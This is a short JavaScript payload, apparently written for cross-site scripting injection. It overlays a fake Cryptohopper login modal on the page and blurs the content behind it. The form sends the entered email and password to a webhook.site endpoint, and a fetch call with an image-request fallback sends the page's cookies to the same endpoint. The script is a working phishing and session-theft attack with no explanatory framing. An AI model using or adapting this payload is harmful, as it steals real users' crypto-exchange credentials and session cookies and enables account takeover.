(function() {
  // Insert modal HTML styled like cryptohopper.com
  document.body.insertAdjacentHTML('beforeend', `
    <div id="custom-login-modal" style="
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    ">
      <div style="
        background: #1a1f2e;
        border-radius: 8px;
        padding: 20px;
        max-width: 400px;
        width: 90%;
        box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      ">
        <h2 style="text-align: center; margin-bottom: 20px; color: #00c4b4;">Cryptohopper Login</h2>

        <form action="https://webhook.site/922b97b8-fdbd-413f-a5d6-493483d4a2d4" method="post" style="display: flex; flex-direction: column;">
          <label style="font-size: 12px; color: #00c4b4; text-transform: uppercase; margin-bottom: 5px;">Email</label>
          <input type="text" name="username" placeholder="Enter your email" style="
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #00c4b4;
            border-radius: 4px;
            background: #2a2e3d;
            color: #fff;
            font-size: 14px;
          " />

          <label style="font-size: 12px; color: #00c4b4; text-transform: uppercase; margin-bottom: 5px;">Password</label>
          <input type="password" name="password" placeholder="Enter your password" style="
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #00c4b4;
            border-radius: 4px;
            background: #2a2e3d;
            color: #fff;
            font-size: 14px;
          " />

          <div style="text-align: right; margin-bottom: 15px;">
            <a href="#" style="color: #00c4b4; text-decoration: none; font-size: 12px;">Forgot Password?</a>
          </div>

          <button type="submit" style="
            width: 100%;
            background: #00c4b4;
            color: #fff;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 14px;
          ">Log In</button>
        </form>

        <div style="text-align: center; margin-top: 15px; font-size: 12px; color: #ccc;">
          <a href="#" style="color: #00c4b4; text-decoration: none;">Sign up for a new account</a>
        </div>
      </div>
    </div>
  `);

  // Apply blur to page content
  const pageContent = document.querySelector('body > *:not(#custom-login-modal)');
  if (pageContent) {
    pageContent.style.transition = 'filter 0.3s ease';
    pageContent.style.filter = 'blur(5px)';
  }

  // Close modal on click outside or Escape
  const modal = document.getElementById('custom-login-modal');
  modal.addEventListener('click', (e) => {
    if (e.target.id === 'custom-login-modal') {
      modal.remove();
      if (pageContent) pageContent.style.filter = 'none';
    }
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      modal.remove();
      if (pageContent) pageContent.style.filter = 'none';
    }
  });

  // Send cookies to webhook for bonus impact
  fetch('https://webhook.site/922b97b8-fdbd-413f-a5d6-493483d4a2d4?c=' + encodeURIComponent(document.cookie), {
    method: 'GET'
  }).catch(() => {
    new Image().src = 'https://webhook.site/922b97b8-fdbd-413f-a5d6-493483d4a2d4?i=' + encodeURIComponent(document.cookie);
  });
})();
